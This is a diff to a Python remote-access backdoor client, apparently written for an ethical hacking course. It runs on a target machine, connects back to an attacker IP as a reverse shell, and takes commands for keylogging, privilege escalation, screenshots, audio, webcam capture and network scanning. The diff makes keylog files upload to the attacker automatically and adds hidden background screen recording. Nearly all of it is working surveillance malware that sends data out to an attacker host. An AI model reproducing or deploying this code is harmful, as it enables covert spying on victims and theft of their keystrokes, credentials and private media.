@@ -1,7 +1,6 @@
 ################################################
-# Enhanced Backdoor Client (Target Machine)    #
-# Author: Enhanced for DES484 Assignment       #
-# Class: SIIT Ethical Hacking                  #
+# Backdoor Client (Target Machine)             #
+# Class: DES484 Ethical Hacking                #
 # WARNING: For Educational Purposes Only!      #
 #                                              #
 # USAGE: Run this on the TARGET machine        #
@@ -20,7 +19,7 @@ import sys
 try:
     from features.keylogger import Keylogger, FallbackKeylogger, PYNPUT_AVAILABLE
     from features.privilege_escalation import PrivilegeEscalation
-    from features.screen_audio_capture import ScreenCapture, AudioCapture, WebcamCapture
+    from features.media_capture_tool import ScreenCapture, AudioCapture, WebcamCapture, ScreenRecorder
     from features.network_discovery import NetworkDiscovery
     FEATURES_AVAILABLE = True
 except ImportError:
@@ -29,7 +28,7 @@ except ImportError:
 
 
 class BackdoorClient:
-    """Enhanced backdoor client with advanced features"""
+    """Backdoor client with advanced features"""
     
     def __init__(self, host='192.168.0.100', port=5555):
         self.host = host
@@ -43,6 +42,7 @@ class BackdoorClient:
             self.screen_capture = ScreenCapture()
             self.audio_capture = AudioCapture()
             self.webcam_capture = WebcamCapture()
+            self.screen_recorder = ScreenRecorder()
             self.network_discovery = NetworkDiscovery()
         else:
             self.keylogger = None
@@ -50,6 +50,7 @@ class BackdoorClient:
             self.screen_capture = None
             self.audio_capture = None
             self.webcam_capture = None
+            self.screen_recorder = None
             self.network_discovery = None
     
     def reliable_send(self, data):
@@ -128,7 +129,10 @@ class BackdoorClient:
                 self.send_advanced_help()
                 return 'continue'
             
+
             # Keylogger commands
+
+            # start keylogger
             elif command == 'keylog_start':
                 if self.keylogger:
                     result = self.keylogger.start()
@@ -137,6 +141,7 @@ class BackdoorClient:
                     self.reliable_send("Keylogger feature not available")
                 return 'continue'
             
+            # stop keylogger
             elif command == 'keylog_stop':
                 if self.keylogger:
                     result = self.keylogger.stop()
@@ -145,14 +150,29 @@ class BackdoorClient:
                     self.reliable_send("Keylogger feature not available")
                 return 'continue'
             
+            # dump keylogger logs and download file
             elif command == 'keylog_dump':
                 if self.keylogger:
-                    result = self.keylogger.get_logs()
-                    self.reliable_send(result)
+                    # First, save any buffered content
+                    if hasattr(self.keylogger, 'save_log'):
+                        self.keylogger.save_log()
+                    
+                    # Get the log file path
+                    log_file = self.keylogger.log_file
+                    
+                    # Check if log file exists and has content
+                    if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
+                        # Send confirmation message
+                        self.reliable_send(f"Keylog file ready: {log_file}")
+                        # Automatically upload the file to attacker
+                        self.upload_file(log_file)
+                    else:
+                        self.reliable_send("No keylog file found or file is empty")
                 else:
                     self.reliable_send("Keylogger feature not available")
                 return 'continue'
             
+            # clear keylogger logs
             elif command == 'keylog_clear':
                 if self.keylogger:
                     result = self.keylogger.clear_logs()
@@ -161,6 +181,7 @@ class BackdoorClient:
                     self.reliable_send("Keylogger feature not available")
                 return 'continue'
             
+            # manual log (fallback keylogger)
             elif command.startswith('keylog_manual'):
                 if self.keylogger:
                     parts = command.split(' ', 1)
@@ -174,6 +195,7 @@ class BackdoorClient:
                     self.reliable_send("Keylogger feature not available")
                 return 'continue'
             
+            # check keylogger status
             elif command == 'keylog_status':
                 if self.keylogger:
                     status = self.keylogger.get_status()
@@ -226,7 +248,10 @@ class BackdoorClient:
                     self.reliable_send("Privilege escalation feature not available")
                 return 'continue'
             
+
             # Screen capture commands
+
+            # single screenshot
             elif command == 'screenshot':
                 if self.screen_capture:
                     result = self.screen_capture.capture_screenshot()
@@ -235,6 +260,7 @@ class BackdoorClient:
                     self.reliable_send("Screen capture feature not available")
                 return 'continue'
             
+            # multi screenshot
             elif command.startswith('screenshot_multi'):
                 if self.screen_capture:
                     parts = command.split()
@@ -246,6 +272,7 @@ class BackdoorClient:
                     self.reliable_send("Screen capture feature not available")
                 return 'continue'
             
+            # list screenshots
             elif command == 'screenshot_list':
                 if self.screen_capture:
                     result = self.screen_capture.list_screenshots()
@@ -254,7 +281,10 @@ class BackdoorClient:
                     self.reliable_send("Screen capture feature not available")
                 return 'continue'
             
+
             # Audio capture commands
+
+            # record audio
             elif command.startswith('audio_record'):
                 if self.audio_capture:
                     parts = command.split()
@@ -265,6 +295,16 @@ class BackdoorClient:
                     self.reliable_send("Audio capture feature not available")
                 return 'continue'
             
+            # stop audio recording
+            elif command == 'audio_stop':
+                if self.audio_capture:
+                    result = self.audio_capture.stop_audio()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Audio capture feature not available")
+                return 'continue'
+            
+            # list audio recordings
             elif command == 'audio_list':
                 if self.audio_capture:
                     result = self.audio_capture.list_recordings()
@@ -273,7 +313,63 @@ class BackdoorClient:
                     self.reliable_send("Audio capture feature not available")
                 return 'continue'
             
+
+            # Screen recording commands
+
+            # record screen
+            elif command.startswith('record_screen'):
+                if self.screen_recorder:
+                    parts = command.split()
+                    duration = int(parts[1]) if len(parts) > 1 else 10
+                    fps = int(parts[2]) if len(parts) > 2 else 15
+                    result = self.screen_recorder.record_screen(duration=duration, fps=fps)
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Screen recording feature not available")
+                return 'continue'
+            
+            # background screen recording commands
+            elif command == 'record_start':
+                if self.screen_recorder:
+                    parts = command.split()
+                    max_duration = int(parts[1]) if len(parts) > 1 else 3600
+                    result = self.screen_recorder.start_background_recording(max_duration=max_duration)
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Screen recording feature not available")
+                return 'continue'
+            
+            # stop background recording
+            elif command == 'record_stop':
+                if self.screen_recorder:
+                    result = self.screen_recorder.stop_recording()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Screen recording feature not available")
+                return 'continue'
+            
+            # check recording status
+            elif command == 'record_status':
+                if self.screen_recorder:
+                    result = self.screen_recorder.get_recording_status()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Screen recording feature not available")
+                return 'continue'
+            
+            # list screen recordings
+            elif command == 'record_list':
+                if self.screen_recorder:
+                    result = self.screen_recorder.list_recordings()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Screen recording feature not available")
+                return 'continue'
+            
+
             # Webcam capture commands
+
+            # capture webcam image  
             elif command == 'webcam_snap':
                 if self.webcam_capture:
                     result = self.webcam_capture.capture_image()
@@ -282,7 +378,18 @@ class BackdoorClient:
                     self.reliable_send("Webcam capture feature not available")
                 return 'continue'
             
+            # list webcam images
+            elif command == 'webcam_list':
+                if self.webcam_capture:
+                    result = self.webcam_capture.list_images()
+                    self.reliable_send(result)
+                else:
+                    self.reliable_send("Webcam capture feature not available")
+                return 'continue'
+
             # Network discovery commands
+
+            # network information
             elif command == 'net_info':
                 if self.network_discovery:
                     info = self.network_discovery.get_network_info()
@@ -292,6 +399,7 @@ class BackdoorClient:
                     self.reliable_send("Network discovery feature not available")
                 return 'continue'
             
+            # scan local network
             elif command == 'net_scan':
                 if self.network_discovery:
                     result = self.network_discovery.discover_local_network()
@@ -300,6 +408,7 @@ class BackdoorClient:
                     self.reliable_send("Network discovery feature not available")
                 return 'continue'
             
+            # active connections
             elif command == 'net_connections':
                 if self.network_discovery:
                     result = self.network_discovery.get_active_connections()
@@ -308,6 +417,7 @@ class BackdoorClient:
                     self.reliable_send("Network discovery feature not available")
                 return 'continue'
             
+            # port scan host
             elif command.startswith('net_portscan'):
                 if self.network_discovery:
                     parts = command.split()
@@ -320,7 +430,8 @@ class BackdoorClient:
                 else:
                     self.reliable_send("Network discovery feature not available")
                 return 'continue'
-            
+
+            # network public IP
             elif command == 'net_public_ip':
                 if self.network_discovery:
                     result = self.network_discovery.get_public_ip()
@@ -329,6 +440,7 @@ class BackdoorClient:
                     self.reliable_send("Network discovery feature not available")
                 return 'continue'
             
+            # check internet connectivity
             elif command == 'net_check_internet':
                 if self.network_discovery:
                     result = self.network_discovery.check_internet_connectivity()
@@ -360,7 +472,8 @@ class BackdoorClient:
         except Exception as e:
             self.reliable_send(f"Error executing command: {str(e)}")
             return 'continue'
-    
+
+    # Send advanced help information
     def send_advanced_help(self):
         """Send help information about advanced features"""
         help_text = """
@@ -377,7 +490,7 @@ class BackdoorClient:
         KEYLOGGER:
         keylog_start        - Start keylogger
         keylog_stop         - Stop keylogger
-        keylog_dump         - Display captured keystrokes
+        keylog_dump         - Download keylog file (saved as keylog_dump_TIMESTAMP.txt)
         keylog_clear        - Clear keylog file
         keylog_status       - Check keylogger status
         keylog_manual <text> - Manually log text (fallback mode)
@@ -395,6 +508,11 @@ class BackdoorClient:
         screenshot_list     - List captured screenshots
         audio_record <sec>  - Record audio (default 10 seconds)
         audio_list          - List audio recordings
+        record_screen <sec> <fps> - Record screen (default 10s, 15fps)
+        record_start <max>  - Start background recording (max duration in seconds)
+        record_stop         - Stop background recording
+        record_status       - Check recording status
+        record_list         - List screen recordings
         webcam_snap         - Capture webcam image
 
         NETWORK DISCOVERY:
@@ -409,6 +527,7 @@ class BackdoorClient:
         """
         self.reliable_send(help_text)
     
+    # get system information
     def get_system_info(self):
         """Gather comprehensive system information"""
         import platform
@@ -432,7 +551,8 @@ class BackdoorClient:
             info += f"\nPrivileged: {self.priv_esc.is_admin}"
         
         return info
-    
+
+    # Main shell function for command execution
     def shell(self):
         """Main shell function for command execution"""
         while True:
@@ -443,7 +563,8 @@ class BackdoorClient:
             result = self.handle_command(command)
             if result == 'quit':
                 break
-    
+
+    # Establish connection to attacker machine (reverse shell)
     def connection(self):
         """Establish connection to attacker machine (reverse shell)"""
         while True:
@@ -470,7 +591,6 @@ if __name__ == "__main__":
     print("=" * 70)
     
     # Configuration - Change these to match your attacker machine
-    # ATTACKER_HOST = '192.168.0.100'  # Change to attacker's IP address
     ATTACKER_HOST = '192.168.0.107'  # Change to attacker's IP address
     ATTACKER_PORT = 5556            # Must match port in server.py
     
